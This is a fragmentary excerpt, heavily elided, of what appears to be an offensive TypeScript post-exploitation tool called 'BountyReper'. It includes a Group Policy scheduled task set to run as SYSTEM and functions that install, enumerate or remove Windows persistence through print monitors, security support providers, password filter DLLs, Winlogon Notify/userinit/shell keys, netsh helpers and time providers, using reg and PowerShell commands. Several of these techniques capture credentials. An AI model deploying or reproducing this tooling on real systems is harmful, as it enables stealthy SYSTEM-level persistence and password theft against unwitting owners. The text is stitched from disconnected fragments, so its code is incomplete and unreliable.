...
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
    <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43AEB5B}" name="BountyReper-Task" image="0" changed="$now" uid="$taskGuid" userContext="0" removePolicy="0">
        <Properties action="C" name="BountyReper-Task" runAs="NT AUTHORITY\\SYSTEM" logonType="S4U">
            <Task version="1.2">
                <Principals>
                    <Principal id="Author">
...
export async function printMonitorPersist(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const name = argVal(args, "--name") || "BountyReperMon"
...
export async function sspPersist(args: string[], timeout: number): Promise<HookResult> {
  ...
  const name = argVal(args, "--name") || "BountyReperSSP"
...
export async function passwordFilter(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const dll = argVal(args, "--dll")
  const filterName = argVal(args, "--name") || "BountyReperPF"
  const findings: Finding[] = []
...
export async function winlogonPersist(args: string[], timeout: number): Promise<HookResult> {
  ...
  if (activeExec === "cmd" || activeExec === "bat") {
    ...
    if (action === "install") {
      ...
      if (key === "notify") {
        const notifyKey = `${winlogonCmd}\\Notify\\BountyReper`
    ...
    if (action === "restore") {
      ...
      if (key === "notify") await cmd(`reg delete "${winlogonCmd}\\Notify\\BountyReper" /f`, timeout)
...
`
    ...
    if (key === "notify") {
      const script = `
$notifyPath = '${winlogonPath}\\Notify\\BountyReper'
    ...
    const script =
      key === "userinit"
        ...
        : key === "shell"
          ...
          : `Remove-Item '${winlogonPath}\\Notify\\BountyReper' -Recurse -Force -ErrorAction SilentlyContinue; Write-Output "[+] Notify key removed"`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }
...
export async function netshHelper(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const dll = argVal(args, "--dll")
  const helperName = argVal(args, "--name") || "BountyReperHelper"
  const findings: Finding[] = []
...
export async function timeProvider(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const dll = argVal(args, "--dll")
  const providerName = argVal(args, "--name") || "BountyReperTimeProvider"
  const findings: Finding[] = []
